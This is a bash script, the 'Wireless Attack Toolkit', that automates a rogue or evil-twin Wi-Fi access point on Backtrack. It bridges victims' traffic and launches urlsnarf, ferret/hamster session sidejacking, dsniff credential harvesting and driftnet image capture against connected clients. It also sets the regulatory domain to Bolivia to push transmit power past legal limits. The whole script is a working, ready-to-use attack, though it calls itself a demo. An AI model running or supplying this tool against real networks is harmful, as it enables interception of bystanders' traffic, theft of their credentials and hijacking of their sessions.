#!/bin/bash

###############################################################################################
#                                                                                             #
# The Wireless Attack Toolkit (WAT) is a quick and easy to use bash script for setting        #
# up a malicious access point. The goal of this tool is to be able to quickly demo this       #
# type of attack on Backtrack 5r3.This tool does not currently include SSL traffic capture    #
# as SSLStrip seems to be having issues in a fully updated Backtrack 5r3 environment. I will  #
# add this in later once it works.                                                            #
###############################################################################################
# v0.1 - 9.12.2013                                                                            #
#                                                                                             #
# Copyright (C) 2013  Ryker Exum                                                              #
# This program is free software; you can redistribute it and/or modify it under the terms of  #
# the GNU General Public License as published by the Free Software Foundation; either version #
# 2 of the License, or any later version.                                                     #
#                                                                                             #
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
# See the GNU General Public License for more details.                                        #
#                                                                                             #
# You should have received a copy of the GNU General Public License along with this program;  #
# if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,       #
# Boston, MA  02110-1301, USA.                                                                #
#                                                                                             #
###############################################################################################


# Ask the user some questions...
clear
echo "-----------------------------------------------------------------"
echo "---------- Wireless Attack Toolkit (WAT) by @uhaba --------------"
echo "-- Hit me up on the twitters if you have feedback or questions --"
echo "-----------------------------------------------------------------"
sleep 1
echo
route -n -A inet | grep UG
echo
echo "Enter the gateway IP address for your network which should be listed above."
echo -n "For example 192.168.0.1: "
read gatewayip
echo
ifconfig | grep "Link encap"
echo
echo "Enter your interface that is connected to the internet,"
echo -n "this should be listed above: (ex: eth1) "
read GW_INTERFACE
echo
echo "Enter your interface to be used for the fake AP. This should also listed above."
echo -n "If you don't see it, is it connected to your VM? (ex: wlan0) "
read CARD_INTERFACE
clear
echo "Enter the ESSID you want to use for your rouge AP. (ex: fakeap) "
echo -n "Use an existing ESSID to take over their traffic. New ESSID: "
read ESSID
echo -n "Enter the channel you want the fake AP to run on: (pick # 1-12) "
read CHANNEL
echo "Do you have an alpha USB wireless adapter you want to crank"
echo -n "the power up on? (y/n) "
read "MOPOWA"
clear

# Turn up the power
if [ $MOPOWA = "y" ] ; then
ifconfig $CARD_INTERFACE down
iw reg set BO
iw dev $CARD_INTERFACE set txpower fixed 3000
echo "Power upgraded. Wait a sec for $CARD_INTERFACE to come back online..."
ifconfig $CARD_INTERFACE up
sleep 5
fi
if [ $MOPOWA = "n" ] ; then
echo
fi

# Starting monitor mode on the desired interface
airmon-ng check kill
sleep 1
airmon-ng start "$CARD_INTERFACE"
sleep 2
clear

# ID the monitor mode interface
iwconfig | grep "Mode:Monitor"
echo
echo "What interface is now in monitor mode?"
read MONITOR
clear

# Fake ap setup
echo "======> [Configuring Airbase-ng....]"
echo
echo "How do you want to run Airbase-ng?"
echo "Selecting "b" will run Airbase-ng in a basic configuration."
echo "Selecting "s" will give you a chance to view the help contents and input some"
echo "additional switches to be used. By default switches -c and -e are used."
echo
echo "If you plan to takeover another network, use option s and add switch "-0""
echo "if the target is running WEP or WPA encryption. WPA2 is not currently supported"
echo "by airbase-ng. Supposedly a fix is in the works. Sorry."
echo
echo "If you select option "s" you must specify something or airbase-ng will fail!"
echo
echo "Select "e" to run Airbase-ng in evil-twin mode." 
echo "This will generate responses to all wireless network probes."
echo "Expect all devices in your proximity to connect to you."
echo "-------------USE OPTION "e" WITH EXTREME CAUTION---------------"
echo "--Don't use the "e" option around a large number of clients---"
echo "-----------------It may cause a wireless DoS------------------"
echo
echo "Please input an option: b, s, or e "
echo
read ANSWER
clear

# Run if user wants to add some switches
if [ $ANSWER = "s" ] ; then
echo
airbase-ng --help
echo
echo "Enter any additional switches/data you want to use."
echo "Please note -c, -v, and -e are included for you already." 
echo
read SWITCHES
echo
echo "======> [Starting Airbase-ng...]"
xterm -geometry 75x15-0+0 -T "Airbase-ng - $ESSID - $MONITOR" -e airbase-ng $SWITCHES -c "$CHANNEL" -e "$ESSID" -v $MONITOR &
sleep 2
fi

# Run if user wants to run in evil twin mode
if [ $ANSWER = "e" ] ; then
echo
echo "======> [Starting Airbase-ng...]"
xterm -geometry 75x15-0+0 -T "Airbase-ng - $ESSID - $MONITOR" -e airbase-ng -v -P -C 30 $MONITOR &
sleep 2
fi

# Run if user wants to keep it simple
if [ $ANSWER = "b" ] ; then
echo
echo "======> [Starting Airbase-ng...]"
xterm -geometry 75x15-0+0 -T "Airbase-ng - $ESSID - $MONITOR" -e airbase-ng -c "$CHANNEL" -v -e "$ESSID" $MONITOR &
sleep 2
fi
clear

# User assigns a name to the bridged interface
echo -n "What do you want to call your bridge interface? (ex: mitm)  "
read -e BRIDGE
brctl addbr "$BRIDGE"

# Select the two interfaces your bridge will use
brctl addif "$BRIDGE" "$GW_INTERFACE"
brctl addif "$BRIDGE" at0	

# Remove any IP address on the interface
ifconfig "$GW_INTERFACE" 0.0.0.0 up
ifconfig at0 0.0.0.0 up	

# Use DHCP to assign an IP address to the bridged interface
echo "======> [Provide DHCP addressing to the bridge interface]"
sleep 1
dhclient3 "$BRIDGE"	
clear
# View the information about the bridge
echo -n "Heres the info on the bridged interface: "
brctl show	
echo "The access point" $ESSID "should now be up and running"
echo
echo
sleep 2

# Start URL Snarf
xterm -geometry 75x15-0+250 -T urlsnarf -e urlsnarf -i at0 &

# Setup a sidejacking attack with ferret and hamster
echo "Do you want to perform a sidejacking attack against connected clients? (y/n)"
echo "**Note since SSLStrip is not currently installed, this attack only works"
echo "against sites that send cookies across non-SSL connections."
read SIDEJACK

# Start setting up the sidejacking attack if they said yes...
if [ $SIDEJACK = "y" ] ; then
clear
echo "This attack requires a few steps to setup that this script"
echo "can't accomplish without your help. You'll need to set the"
echo "proxy settings in firefox. I'm going to include this in a"
echo "later rev."
sleep 8
echo "Starting hamster and ferret for you."
xterm -geometry 75x15+0+250 -T "hamster webserver" -e /pentest/sniffers/hamster/./hamster &
xterm -geometry 75x15+0+300 -T "ferret sniffer" -e /pentest/sniffers/hamster/./ferret -i mon0 &
sleep 2
clear
echo "Starting Firefox for you. You now need to update the"
echo "proxy server settings to 127.0.0.1 port 1234."
echo "You can find this under Edit>Preferences>Advanced button"
echo "Select the [Network] tab"
echo "Click on the connection settings button and choose manual proxy"
xterm -geometry 75x5+0+350 -T "Firefox browser" -e firefox &

# Check if proxy settings are done
echo "Pausing while you make these changes..."
echo "Come back and type "done" when you're ready to proceed."
echo -n "Type done and press enter to continue: "
read PROXY
if [ $PROXY = "done" ] ; then
clear
echo "I'm about to open http://hamster for you"
echo "You'll need to click on the no-script plug-in and allow"
echo "all scripts globally. It will make sure the attack runs smoothly."
echo "Then refresh the page."
sleep 5
firefox http://hamster &
fi

if [ $PROXY != "done" ] ; then
echo "This script is currently one way. You'll have to start over. Sorry."
echo "Going to run cleanup on the settings so far so you can try again"
echo
echo "======> [Killing everything but wireshark for you...]"
echo
pkill driftnet
pkill urlsnarf
pkill airbase-ng
pkill xterm
pkill firefox
pkill ferret
pkill hamster
airmon-ng stop $MONITOR
sleep 2

ifconfig $BRIDGE down
brctl delif $BRIDGE $GW_INTERFACE
brctl delif $BRIDGE at0	
brctl delbr $BRIDGE
dhclient3 $GW_INTERFACE
ifconfig $CARD_INTERFACE down
iw reg set US
ifconfig $CARD_INTERFACE up
sleep 5
echo "======> [Clean up complete. Adios...]"
exit
fi
fi

# Ask if they want to run Wireshark
echo "Want me to go ahead and start a live capture via Wireshark for you? (y/n)"
read WIRESHARK

# Run wireshark if they want it
if [ $WIRESHARK = "y" ] ; then
echo
echo "======> [Starting Wireshark...]"
xterm -geometry 75x15+0+0 -T "Wireshark sniffing interface: $MONITOR" -e wireshark -i $BRIDGE -k &
fi

if [ $WIRESHARK != "y" ] ; then
echo "No worries, you can always run it manually if you want..."
fi
clear

# Start DSniff
echo
echo "Do you want to run dsniff to snag <potentially> snag some creds? (y/n)"
echo
read DSNIFF

if [ $DSNIFF = "y" ] ; then
echo
echo "======> [Starting dsniff..."
echo "Don't forget the credentials sometimes take a minute to show up..."
xterm -geometry 75x15+0+350 -T dsniff -e dsniff -i $BRIDGE -cmn -w dsniff_log.txt &
echo
sleep 3
fi

if [ $DSNIFF != "y" ] ; then
echo
fi
clear

# Start driftnet
echo "Do you want to run driftnet to capture/display images? (y/n)"
echo
echo "***Note: This WILL slow client browsing down.***"
echo "You can alternatively export images from a stopped wireshark capture using:"
echo "      File>Export Objects"
echo
read DRIFTNET

if [ $DRIFTNET = "y" ] ; then
echo
echo "Driftnet can be run in two different ways:"
echo "1- Display images to a new window, but don't capture."
echo "2- Capture images to a folder on your desktop."
echo "3- Forget it, I'd rather not"
echo
echo "Which would you like to do? (1, 2, or 3)"
echo 
read DRIFTOPTION

if [ $DRIFTOPTION = "1" ] ; then
echo
echo "======> [Starting driftnet..."
xterm -geometry 75x15-0+350 -T driftnet_cmd -e driftnet -i at0 &
fi
if [ $DRIFTOPTION = "2" ] ; then
echo
echo "======> [Starting driftnet..."
mkdir "Driftnet_TMP"
xterm -geometry 75x15-0+350 -T driftnet_cmd -e driftnet -i at0 -a -d Driftnet_TMP &
fi
if [ $DRIFTOPTION != "1" or "2"] ; then
echo
fi
fi

clear
echo
echo "======> [Everything should be online now...]"
echo "Everything should now be up and running Driftnet images will be saved"
echo "to /Desktop/Driftnet_TMP. These images will be deleted when the tool is closed."
echo
echo "======> [IMPORTANT...]"
echo "Type "stop" in this terminal when you are done to start cleaning up."
echo "Failing to do this may cause you some trouble."
read KILL

# Clean up
if [ $KILL = "stop" ] ; then
echo
echo "======> [Killing everything but wireshark for you...]"
echo
pkill driftnet
pkill urlsnarf
pkill airbase-ng
pkill xterm
pkill ferret
pkill hamster
pkill firefox
airmon-ng stop $MONITOR
sleep 2

ifconfig $BRIDGE down
brctl delif $BRIDGE $GW_INTERFACE
brctl delif $BRIDGE at0	
brctl delbr $BRIDGE
dhclient3 $GW_INTERFACE
ifconfig $CARD_INTERFACE down
iw reg set US
ifconfig $CARD_INTERFACE up
sleep 5
echo "======> [Clean up complete. Adios...]"
exit

fi
exit